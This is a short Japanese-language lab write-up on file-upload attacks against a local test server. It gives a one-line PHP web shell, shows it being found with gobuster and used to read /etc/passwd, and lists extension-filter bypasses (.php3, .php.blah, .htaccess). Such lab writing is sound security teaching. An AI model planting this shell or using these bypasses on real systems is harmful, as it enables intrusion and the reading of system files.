# <span style="color: blue;">Example 1</span>
```
<?php 
  system($_GET["cmd"]); 
?>
```
phpファイルを作成しファイルをuploadする。   
![2d2f8cb8a082a162d86a3d930c8191c0.png](../../_resources/2d2f8cb8a082a162d86a3d930c8191c0-1.png)   

gobusterでアップロードしたファイルを探す   
![5191bbe73247a9d084c26ee601ce6314.png](../../_resources/5191bbe73247a9d084c26ee601ce6314-1.png)　　　
![9462632f1f0670fa182ee7e91714ac18.png](../../_resources/9462632f1f0670fa182ee7e91714ac18.png)  
```
http://192.168.100.185/upload/images/cmd.php?cmd=cat%20/etc/passwd
```
![1b0991664ec97b89975168b117305e7e.png](../../_resources/1b0991664ec97b89975168b117305e7e.png)    
# <span style="color: blue;">Example 2</span>
拡張子の制限があるので.phpファイルをアップロードできない。
![221d3a6ee24b0000e8a67ac5b9b0a3c7.png](../../_resources/221d3a6ee24b0000e8a67ac5b9b0a3c7.png)   
この制限を回避するには、次のいずれかの方法を使用できます。   
- 拡張子を .php3 に変更します。他のシステムでは、.php4 や .php5 のような拡張子でも動作する場合があります。これは、ウェブサーバーの設定に依存します。
- Apache が知らない拡張子 .blah を拡張子 .php の後に使用する。Apacheは拡張子.blahの扱い方を知らないので、次の拡張子.phpに移動し、PHPコードを実行します。
- .htaccessファイルをアップロードし、別の拡張子をPHPで実行できるようにする（このテクニックについては、PentesterLabのトレーニング：（SQLインジェクションからシェルへ：PostgreSQL編）[https://pentesterlab.com/fromsqlitoshellpg_edition.html]で詳しく学ぶことができます）。   

これらの方法のいずれかを使用すると、コマンドを実行できるはずです。
```
http://192.168.100.185/upload/images/cmd.php3?cmd=cat%20/etc/passwd
```

![cfab4f875b3bb0e3dd51a0aeb2f3683f.png](../../_resources/cfab4f875b3bb0e3dd51a0aeb2f3683f.png)   

```
http://192.168.100.185/upload/images/cmd.php.blah?cmd=cat%20/etc/passwd
```

![4c363ab94f37709b55d065ca3b05bb69.png](../../_resources/4c363ab94f37709b55d065ca3b05bb69.png)